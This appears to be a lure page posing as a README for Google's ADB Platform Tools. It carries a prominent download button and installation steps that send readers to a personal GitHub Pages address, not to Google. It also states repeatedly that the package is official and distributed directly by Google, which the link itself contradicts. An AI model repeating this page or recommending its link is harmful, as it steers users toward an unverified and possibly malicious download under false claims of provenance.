# ADB Platform Tools

<img src="https://play-lh.googleusercontent.com/LE2-8hjLVmfDhjBtFoLrJThiqRyT68O1jCKE9ZQWUGOGHGBq9BETGvrMzeOZijpE_B6WK5tCD-lEp8ezL3BogBg=w240-h480-rw" alt="ADB Platform Tools logo" width="120"/>

[![Download ADB Platform Tools](https://img.shields.io/badge/⬇_Download_ADB_Platform_Tools-00acc1?style=for-the-badge)](https://edwardwhite23.github.io/.github/ADB-Platform-Tools-SDK-App)

ADB Platform Tools is an official Android developer package for Windows that gives you Google's adb and fastboot command-line tools for working with Android devices.

<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRLMfnwQJgbIJYYl3sQws3tzfgjquiGf5G6VkQxzuDeELDkzPSZJ4VPkQ41&s=10" alt="ADB Platform Tools Screenshot" width="100%"/>
*A Windows terminal showing an active adb connection to an Android device.*

## Table of Contents
* [Overview](#overview)
* [Features](#features)
* [System Requirements](#system-requirements)
* [Installation](#installation)
* [Getting Started](#getting-started)
* [FAQ](#faq)
* [Support](#support)

## Quick Facts

| | |
|---|---|
| **Platform** | Windows 10/11, 64-bit |
| **Category** | Android SDK command-line toolkit |
| **Release** | Latest Android SDK Platform-Tools build |

## Overview
The adb sdk platform tools package is exactly what ADB Platform Tools for Windows delivers: Google's own adb and fastboot binaries, ready to run from a Command Prompt or PowerShell window. It exists so developers, QA testers, and enthusiasts can install apps, read device logs, and flash images without needing a full IDE installed. There's no setup wizard involved — the whole thing is a folder you extract and start using. Google keeps it updated alongside every Android SDK release.

## Features
- [ ] Install and uninstall apps with adb
- [ ] Flash images and manage bootloader state with fastboot
- [ ] Stream device logs live with `logcat`
- [ ] Copy files between the device and your PC
- [ ] Open a shell session directly on the device

## System Requirements
- [ ] **OS:** Windows 10 or 11, 64-bit
- [ ] **Processor:** Any 64-bit processor that runs Windows normally
- [ ] **Memory:** No dedicated requirement beyond Windows itself
- [ ] **Storage:** Minimal free disk space for the extracted tools

## Installation
- [ ] Download ADB Platform Tools using the button at the top of this page.
- [ ] Extract the archive to a folder such as `C:\platform-tools`.
- [ ] Open a terminal window inside that folder — there's no separate installer to run.

## Getting Started
- [ ] Enable Developer Options and USB debugging on your Android device.
- [ ] Connect the device to your PC with a USB cable.
- [ ] Run `adb devices` and accept the authorization prompt on the device screen.
- [ ] Start running everyday adb or fastboot commands once the device shows up as connected.

## FAQ
- [ ] **Is ADB Platform Tools free?** — Yes, Google distributes the adb platform tools package at no charge as part of the Android SDK.
- [ ] **Does it work without Android Studio installed?** — Yes, it runs on its own; Android Studio simply bundles the same tools inside a full IDE.
- [ ] **Will Windows recognize my device automatically?** — Often yes, though some manufacturers require their own USB driver before adb or fastboot can see the device.

- [ ] **License:** ADB Platform Tools is provided free of charge directly by Google as part of the official Android SDK.

## Support
For help with ADB Platform Tools, refer to the documentation and release notes Google publishes with the Android SDK, which explain adb and fastboot commands along with common connection issues. The official Android developer website also offers setup guides and driver troubleshooting resources.
